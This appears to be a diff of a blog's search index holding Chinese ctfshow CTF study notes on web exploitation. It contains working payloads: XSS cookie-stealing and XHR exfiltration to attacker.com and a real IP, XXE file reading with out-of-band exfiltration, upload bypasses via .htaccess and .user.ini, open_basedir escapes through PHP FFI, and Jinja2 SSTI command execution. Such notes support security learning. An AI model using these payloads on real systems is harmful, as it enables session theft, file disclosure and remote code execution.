-<h3 id="1-使用命令执行函数"><a href="#1-使用命令执行函数" class="headerlink" title="1.使用命令执行函数"></a>1.使用命令执行函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">因为open_basedir的设置只是对目录的限制，对system等命令执行函数是无效的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-使用伪协议-得不到文件内容"><a href="#2-使用伪协议-得不到文件内容" class="headerlink" title="2.使用伪协议(得不到文件内容)"></a>2.使用伪协议(得不到文件内容)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>   ---使用的是glob:<span class="comment">///伪协议，不直接触发 open_basedir 检查可绕过</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="php7-4以上-FFI"><a href="#php7-4以上-FFI" class="headerlink" title="php7.4以上(FFI)"></a>php7.4以上(FFI)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的     </span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常用姿势</title>
     <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
     <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintf函数"><a href="#1-sprintf函数" class="headerlink" title="1.sprintf函数:"></a>1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
@@ -2236,192 +2168,57 @@
       </tags>
   </entry>
   <entry>
-    <title>xss</title>
-    <url>/2025/06/02/ctfshow/xss/</url>
-    <content><![CDATA[<h1 id="常见过滤"><a href="#常见过滤" class="headerlink" title="常见过滤:"></a>常见过滤:</h1><h2 id="如果使用了http-only"><a href="#如果使用了http-only" class="headerlink" title="如果使用了http-only:"></a>如果使用了http-only:</h2><h3 id="1-GET请求外带"><a href="#1-GET请求外带" class="headerlink" title="1.GET请求外带:"></a>1.GET请求外带:</h3><p>GET外带：</p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;接口&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>xxe</title>
+    <url>/2025/06/02/ctfshow/xxe/</url>
+    <content><![CDATA[<h1 id="xxe的原理"><a href="#xxe的原理" class="headerlink" title="xxe的原理:"></a>xxe的原理:</h1><p>可以通过构造恶意 XML 数据，引入外部实体来实现：</p>
+<ul>
+<li>读取本地敏感文件（如 <code>/etc/passwd</code>）</li>
+<li>进行内网 SSRF</li>
+<li>拒绝服务（Billion Laughs）</li>
+<li>执行系统命令（少见，取决于 parser）</li>
+</ul>
+<h2 id="1-xxe的前提"><a href="#1-xxe的前提" class="headerlink" title="1.xxe的前提:"></a>1.xxe的前提:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);    --允许加载外部实体（XXE的前提）</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">---使用DOM解析XML，开启了实体替换（LIBXML_NOENT）和DTD加载（LIBXML_DTDLOAD），这正是XXE攻击生效的关键</span><br></pre></td></tr></table></figure>
 
-<p>POST外带:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="comment">// 发送到攻击者服务器</span></span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr2.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;https://attacker.com/post&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-POST请求外带"><a href="#2-POST请求外带" class="headerlink" title="2.POST请求外带:"></a>2.POST请求外带:</h3><p>GET外带：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. POST请求读取目标接口内容</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>POST外带:</p>
-<h1 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法:"></a>利用手法:</h1><h2 id="1-xss原理的分析"><a href="#1-xss原理的分析" class="headerlink" title="1.xss原理的分析:"></a>1.xss原理的分析:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">向网站注入恶意JavaScript代码，让别人的浏览器在受信任的网页上下文中“执行攻击者的脚本”。</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-检测方式"><a href="#2-检测方式" class="headerlink" title="2. 检测方式:"></a>2. 检测方式:</h2><table>
+<h2 id="2-常见的攻击方式"><a href="#2-常见的攻击方式" class="headerlink" title="2.常见的攻击方式:"></a>2.常见的攻击方式:</h2><table>
 <thead>
 <tr>
-<th>场景&#x2F;说明</th>
-<th>Payload示例</th>
-<th>备注&#x2F;实战效果</th>
+<th>类型</th>
+<th>描述</th>
+<th>示例</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>经典弹窗</td>
-<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>判断能否插入原生JS</td>
+<td>📁 本地文件读取</td>
+<td>读取敏感文件</td>
+<td><code>file:///etc/passwd</code></td>
 </tr>
 <tr>
-<td>双引号闭合</td>
-<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>用于参数被包在引号里</td>
+<td>🌐 SSRF</td>
+<td>访问内网资源</td>
+<td><code>http://127.0.0.1/admin</code></td>
 </tr>
 <tr>
-<td>单引号闭合</td>
-<td><code>&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>同上</td>
+<td>💣 DoS</td>
+<td>百万笑攻击导致内存爆炸</td>
+<td><code>&lt;!ENTITY a &quot;&amp;a;&amp;a;&amp;a;&quot;&gt;</code></td>
 </tr>
 <tr>
-<td>img标签onerror</td>
-<td><code>&lt;img src=1 onerror=alert(1)&gt;</code></td>
-<td>绕过部分过滤，低版本IE必弹窗</td>
+<td>📤 外带</td>
+<td>将数据发送到外部服务器</td>
+<td><code>http://attacker.com/?d=&amp;xxe;</code></td>
 </tr>
 <tr>
-<td>svg标签onload</td>
-<td><code>&lt;svg/onload=alert(1)&gt;</code></td>
-<td>对svg支持较弱站点，能绕标签限制</td>
-</tr>
-<tr>
-<td>body标签onload</td>
-<td><code>&lt;body onload=alert(1)&gt;</code></td>
-<td>HTML主体注入点</td>
-</tr>
-<tr>
-<td>input标签onfocus</td>
-<td><code>&lt;input autofocus onfocus=alert(1)&gt;</code></td>
-<td>页面插入input时测试</td>
-</tr>
-<tr>
-<td>a标签onclick</td>
-<td><code>&lt;a href=&quot;#&quot; onclick=alert(1)&gt;点我&lt;/a&gt;</code></td>
-<td>需用户操作</td>
-</tr>
-<tr>
-<td>script块注入</td>
-<td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>封闭script后再注入新的</td>
-</tr>
-<tr>
-<td>js事件属性（万能型）</td>
-<td><code>&lt;button onmouseover=alert(1)&gt;XSS&lt;/button&gt;</code></td>
-<td>鼠标事件型绕过</td>
-</tr>
-<tr>
-<td>html注释穿插</td>
-<td><code>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</code></td>
-<td>盲测注释处理不严的模板</td>
-</tr>
-<tr>
-<td>盲打型payload</td>
-<td><code>&lt;img src=1 onerror=fetch(&#39;//你的域名/log?c=&#39;+document.cookie)&gt;</code></td>
-<td>无回显场景，后台日志收集</td>
-</tr>
-<tr>
-<td>反射测试</td>
-<td><code>&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code></td>
-<td>方便区分当前站点</td>
-</tr>
-<tr>
-<td>DOM型测试</td>
-<td><code>#&quot;&gt;&lt;script&gt;alert(document.location)&lt;/script&gt;</code></td>
-<td>DOM拼接位置必测</td>
-</tr>
-<tr>
-<td>href&#x2F;jump跳转型</td>
-<td><code>javascript:alert(1)</code></td>
-<td>测url跳转、链接、按钮</td>
+<td>😈 Blind-XXE</td>
+<td>没有直接输出，通过回显外带</td>
+<td>配合 <code>&lt;!ENTITY xxe SYSTEM &quot;http://x.x.x.x:8080/?data=...&quot; &gt;</code></td>
 </tr>
 </tbody></table>
-<h2 id="3-常见img回流"><a href="#3-常见img回流" class="headerlink" title="3.常见img回流:"></a>3.常见img回流:</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类:"></a>1.分类:</h3><table>
-<thead>
-<tr>
-<th>场景&#x2F;目的</th>
-<th>payload示例</th>
-<th>说明&#x2F;攻防技巧</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>标准最常用</td>
-<td><code>&lt;img src=&quot;http://your.com/xss.php?cookie=&quot;+document.cookie&gt;</code></td>
-<td>简单直观，很多场景可用</td>
-</tr>
-<tr>
-<td>利用onerror事件</td>
-<td><code>&lt;img src=1 onerror=&quot;new Image().src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
-<td>兼容性强，可防止部分src过滤</td>
-</tr>
-<tr>
-<td>onerror多参数</td>
-<td><code>&lt;img src=x onerror=&quot;this.src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
-<td>利用自身src属性，无需new对象</td>
-</tr>
-<tr>
-<td>base64绕过</td>
-<td><code>&lt;img src=1 onerror=&quot;new Image().src=atob(&#39;aHR0cDovL3lvdXIuY29tL3hzcw==&#39;)+document.cookie&quot;&gt;</code></td>
-<td>避免明文URL被过滤</td>
-</tr>
-<tr>
-<td>多事件联合</td>
-<td><code>&lt;img src=1 onerror=&quot;document.body.appendChild(new Image()).src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
-<td>兼容部分内联过滤</td>
-</tr>
-<tr>
-<td>利用fetch</td>
-<td><code>&lt;img src=1 onerror=&quot;fetch(&#39;http://your.com/xss.php?cookie=&#39;+document.cookie)&quot;&gt;</code></td>
-<td>某些现代浏览器可用</td>
-</tr>
-<tr>
-<td>伪装UA等信息回流</td>
-<td><code>&lt;img src=&quot;http://your.com/xss.php?info=&quot;+navigator.userAgent+document.cookie&gt;</code></td>
-<td>携带更多信息</td>
-</tr>
-<tr>
-<td>GET+POST联合</td>
-<td><code>&lt;img src=1 onerror=&quot;var i=new Image();i.src=&#39;http://your.com/xss.php?c=&#39;+document.cookie&quot;&gt;</code></td>
-<td>多种变量名，规避WAF</td>
-</tr>
-</tbody></table>
-<h3 id="2-区别"><a href="#2-区别" class="headerlink" title="2.区别:"></a>2.区别:</h3><table>
-<thead>
-<tr>
-<th>payload类型</th>
-<th>隐蔽性</th>
-<th>兼容性</th>
-<th>是否跳转</th>
-<th>攻防用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>img+src</td>
-<td>高</td>
-<td>很高</td>
-<td>否</td>
-<td>首选，适合所有场景</td>
-</tr>
-<tr>
-<td>img+onerror</td>
-<td>很高</td>
-<td>极高</td>
-<td>否</td>
-<td>绕过滤</td>
-</tr>
-<tr>
-<td>location.href</td>
-<td>低</td>
-<td>高</td>
-<td>是</td>
-<td>测试&#x2F;盲打为主</td>
-</tr>
-<tr>
-<td>fetch&#x2F;xmlhttp</td>
-<td>中</td>
-<td>中高</td>
-<td>否</td>
-<td>现代浏览器为主</td>
-</tr>
-</tbody></table>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h1><h2 id="1-直接"><a href="#1-直接" class="headerlink" title="1.直接:"></a>1.直接:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-数据外带"><a href="#2-数据外带" class="headerlink" title="2.数据外带:"></a>2.数据外带:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;   ---这个位置可以换成php伪协议  </span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://139.224.54.229/xxe.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-一些绕过"><a href="#3-一些绕过" class="headerlink" title="3.一些绕过"></a>3.一些绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以对数据进行UTF-<span class="number">16</span>编码绕过(使用python)</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>web学习</category>
@@ -3135,6 +2932,229 @@
       </tags>
   </entry>
   <entry>
+    <title>文件上传</title>
+    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="1-user-ini的使用"><a href="#1-user-ini的使用" class="headerlink" title="1. .user.ini的使用:"></a>1. .user.ini的使用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-绕过内容里不能包含php"><a href="#2-绕过内容里不能包含php" class="headerlink" title="2.绕过内容里不能包含php:"></a>2.绕过内容里不能包含php:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 条件：short_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. 无条件</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. 条件： 开启配置参数asp_tags=on 且php版本 &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. 条件：php版本 &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-增加文件头"><a href="#3-增加文件头" class="headerlink" title="3.增加文件头:"></a>3.增加文件头:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---是GIF图像格式的一种版本标识</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>魔术头（十六进制）</th>
+<th>魔术头（ASCII）</th>
+<th>示例用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>GIF89a</strong></td>
+<td><code>47 49 46 38 39 61</code></td>
+<td><code>GIF89a</code></td>
+<td>正规 GIF 图</td>
+</tr>
+<tr>
+<td><strong>GIF87a</strong></td>
+<td><code>47 49 46 38 37 61</code></td>
+<td><code>GIF87a</code></td>
+<td>老版本 GIF 图</td>
+</tr>
+<tr>
+<td><strong>PNG</strong></td>
+<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
+<td><code>.PNG....</code></td>
+<td>PNG 图</td>
+</tr>
+<tr>
+<td><strong>JPG</strong> &#x2F; JPEG</td>
+<td><code>FF D8 FF</code></td>
+<td>N&#x2F;A</td>
+<td>开头是 <code>FFD8FF</code>，结尾是 <code>FFD9</code></td>
+</tr>
+<tr>
+<td><strong>PDF</strong></td>
+<td><code>25 50 44 46 2D</code></td>
+<td><code>%PDF-</code></td>
+<td>经典文档上传绕过</td>
+</tr>
+<tr>
+<td><strong>ZIP</strong></td>
+<td><code>50 4B 03 04</code></td>
+<td><code>PK..</code></td>
+<td>上传压缩包</td>
+</tr>
+<tr>
+<td><strong>RAR</strong></td>
+<td><code>52 61 72 21 1A 07 00</code></td>
+<td><code>Rar!...</code></td>
+<td>压缩文件</td>
+</tr>
+<tr>
+<td><strong>EXE</strong>（Windows）</td>
+<td><code>4D 5A</code></td>
+<td><code>MZ</code></td>
+<td>可执行文件</td>
+</tr>
+<tr>
+<td><strong>ELF</strong>（Linux）</td>
+<td><code>7F 45 4C 46</code></td>
+<td><code>.ELF</code></td>
+<td>Linux 二进制</td>
+</tr>
+<tr>
+<td><strong>MP3</strong></td>
+<td><code>49 44 33</code></td>
+<td><code>ID3</code></td>
+<td>音频文件头</td>
+</tr>
+<tr>
+<td><strong>DOCX &#x2F; XLSX &#x2F; PPTX</strong></td>
+<td><code>50 4B 03 04</code></td>
+<td>ZIP！</td>
+<td>Office 新版其实是 ZIP 容器</td>
+</tr>
+<tr>
+<td><strong>OLD DOC (97-2003)</strong></td>
+<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
+<td>N&#x2F;A</td>
+<td>老式 Office 文件</td>
+</tr>
+</tbody></table>
+<h3 id="4-远程包含"><a href="#4-远程包含" class="headerlink" title="4.远程包含:"></a>4.远程包含:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在服务器上可以通过ip转数字，让他访问木马脚本网站，并执行</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-通过jpg-gif-png二次渲染"><a href="#5-通过jpg-gif-png二次渲染" class="headerlink" title="5.通过jpg.gif.png二次渲染;"></a>5.通过jpg.gif.png二次渲染;</h3><h4 id="1-是否存在二次渲染"><a href="#1-是否存在二次渲染" class="headerlink" title="1.是否存在二次渲染:"></a>1.是否存在二次渲染:</h4><table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+<th>判断方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>上传后图像被重新压缩</td>
+<td>MD5不一致</td>
+<td>上传后下载图片对比</td>
+</tr>
+<tr>
+<td>上传的 EXIF 信息被清除</td>
+<td>文件属性被抹掉</td>
+<td><code>exif_read_data()</code> 检查</td>
+</tr>
+<tr>
+<td>伪代码失效</td>
+<td>木马内容被去掉</td>
+<td><code>&lt;?php ... ?&gt;</code> 被清空</td>
+</tr>
+<tr>
+<td>文件大小被大幅缩小</td>
+<td>说明被重新处理</td>
+<td>查看上传前后大小差距</td>
+</tr>
+<tr>
+<td>Webshell 不再执行</td>
+<td>二次渲染清除了恶意代码</td>
+<td>手动访问判断是否能执行PHP代码</td>
+</tr>
+</tbody></table>
+<h3 id="6-通过-htaccess包含"><a href="#6-通过-htaccess包含" class="headerlink" title="6.通过.htaccess包含:"></a>6.通过.htaccess包含:</h3><p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ssti</title>
+    <url>/2025/06/02/ctfshow/ssti/</url>
+    <content><![CDATA[<h1 id="常见检测"><a href="#常见检测" class="headerlink" title="常见检测:"></a>常见检测:</h1><table>
+<thead>
+<tr>
+<th>语言</th>
+<th>模板引擎</th>
+<th>示例 Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Python</td>
+<td>Jinja2</td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code> → 49</td>
+</tr>
+<tr>
+<td>Python</td>
+<td>Mako</td>
+<td><code>$&#123;7*7&#125;</code> → 49</td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>Smarty</td>
+<td><code>&#123;$smarty.version&#125;</code></td>
+</tr>
+<tr>
+<td>Java</td>
+<td>FreeMarker</td>
+<td><code>$&#123;7*7&#125;</code> → 49</td>
+</tr>
+<tr>
+<td>Java</td>
+<td>Velocity</td>
+<td><code>#set($x=7*7) $x</code></td>
+</tr>
+<tr>
+<td>Node.js</td>
+<td>EJS</td>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+</tr>
+</tbody></table>
+<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250527155737650.png" alt="image-20250527155737650"></p>
+<h1 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块:"></a>各个模块:</h1><h2 id="1-jinja2"><a href="#1-jinja2" class="headerlink" title="1.jinja2:"></a>1.jinja2:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br><span class="line">查看所有模块:</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-Python-2-7"><a href="#1-Python-2-7" class="headerlink" title="1. Python 2.7"></a>1. Python 2.7</h3><h4 id="1-获取基类"><a href="#1-获取基类" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 找到 file 类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line"></span><br><span class="line"># 读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：通过 func_globals.linecache.os 执行系统命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法2：通过 __builtins__ 中的 eval 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法3：属性式调用 eval</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法4：调用 __import__ 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法5：索引方式调用 __import__</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-Python-3-7"><a href="#2-Python-3-7" class="headerlink" title="2. Python 3.7"></a>2. Python 3.7</h3><h4 id="1-获取基类-1"><a href="#1-获取基类-1" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
+
+<hr>
